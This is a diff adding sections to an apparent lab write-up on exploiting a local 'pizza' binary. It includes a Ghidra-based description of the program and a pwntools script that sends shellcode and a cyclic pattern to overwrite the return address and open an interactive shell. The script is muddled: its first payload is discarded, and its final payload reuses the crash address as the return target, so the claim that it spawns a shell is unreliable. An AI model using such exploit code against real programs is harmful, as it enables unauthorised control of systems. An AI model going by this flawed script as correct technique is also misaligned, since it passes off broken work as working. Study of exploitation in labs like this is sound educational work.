@@ -28,3 +28,54 @@ Moreover, running the file `python3 python_injection.py` provided the output bel
 Furthermore, Opening the executable in Ghidra to really see how it works (and the library functions it is using). From the C code in Ghidra disassemble pane it can be seen that, the program is a basic pizza delivery application that accepts a user's name, the quantity of pizzas they wish to purchase, and their credit card information and then calculates the total cost of the transaction. In terms of how it works; the program starts by declaring some variables, including a pointer to a character array that will hold the user's name, a pointer to a block of memory allocated with malloc, and various local variables of different types. The program then prompts the user to enter their name using the print function and reads the input using the getline function. If getline returns 0, the program exits with an error message otherwise, the program then calls the getname function (a custom function defined), passing it pointers as arguments. The program then enters a loop that prompts the user to enter the number of pizzas they want to order using the print function and reads the input using the scanf function. This loop continues until the user enters a valid number between 1 and 10. Once the user enters a valid number, the program calculates the total cost of the order and displays a message using the printf function.The program then reads the user's credit card information using the scanf function and displays a confirmation message using the printf function. The program makes use of the following library functions including but not limited to `malloc` to allocate memory dynamically, `getline` to read input from the user, `printf` to display messages to the user and `scanf` to read input from the user.
 
 Lastly, running the victim program "pizza" in GDB.
+
+## python script using `pwntools` that executes the given program [pizza], leaks the stack offset, and spawns a shell.
+Below is a script in python to run the pizza program, getting the pizza program executable to crash (segfault), stack offset and spawning of the shell. 
+'''
+#!/usr/bin/env python3
+
+from pwn import *
+
+# Set up context
+context.arch = 'amd64'
+context.os = 'linux'
+
+# Define target binary
+binary = './pizza'
+
+# Define payload
+offset = 72  # found via manual testing
+shellcode = asm(shellcraft.amd64.linux.sh())
+padding = b'A' * (offset - len(shellcode))
+payload = shellcode + padding + p64(0xdeadbeef)
+
+# Start process
+p = process(binary)
+
+# Send payload
+p.sendline(payload)
+
+# Get RIP offset
+pattern = cyclic(1000, n=8)
+p = process(binary)
+p.sendline(pattern)
+p.wait()
+core = p.corefile
+rip_offset = cyclic_find(core.rip, n=8)
+log.info(f'RIP offset: {rip_offset}')
+
+# Build final payload
+padding = b'A' * rip_offset
+rip = p64(core.rip)
+payload = padding + rip + b'\n'
+p = process(binary)
+p.send(payload)
+
+# Interact with shell
+p.interactive()
+
+'''
+The #!/usr/bin/env python3 instruction at the beginning of this script is used for specifying the version of python interpreter and its dependencies to use when parsing the script. rAlso the instruction `from pwn import *` which is normally used in exploit development to import the "pwntools" library, to provide a set of useful tools and utilities for interacting with vulnerable programs and services and also  providing functionalities for compiling and executing shellcode. Also,
+context is one of the function's of "pwntools" library that is used to set various context variables that affect the behavior of the library when interacting with vulnerable programs and services. Arch, os, endian, and word_size variables are some of the options that can be set using the context function. Also the command `binary = './pizza'` to define the targeted executable and linkable format.
+
+![Screenshot from 2023-05-01 07-03-16](https://user-images.githubusercontent.com/66968869/235553801-eab2b4a9-3a04-43ee-b9b3-01a0da7dcc42.png)
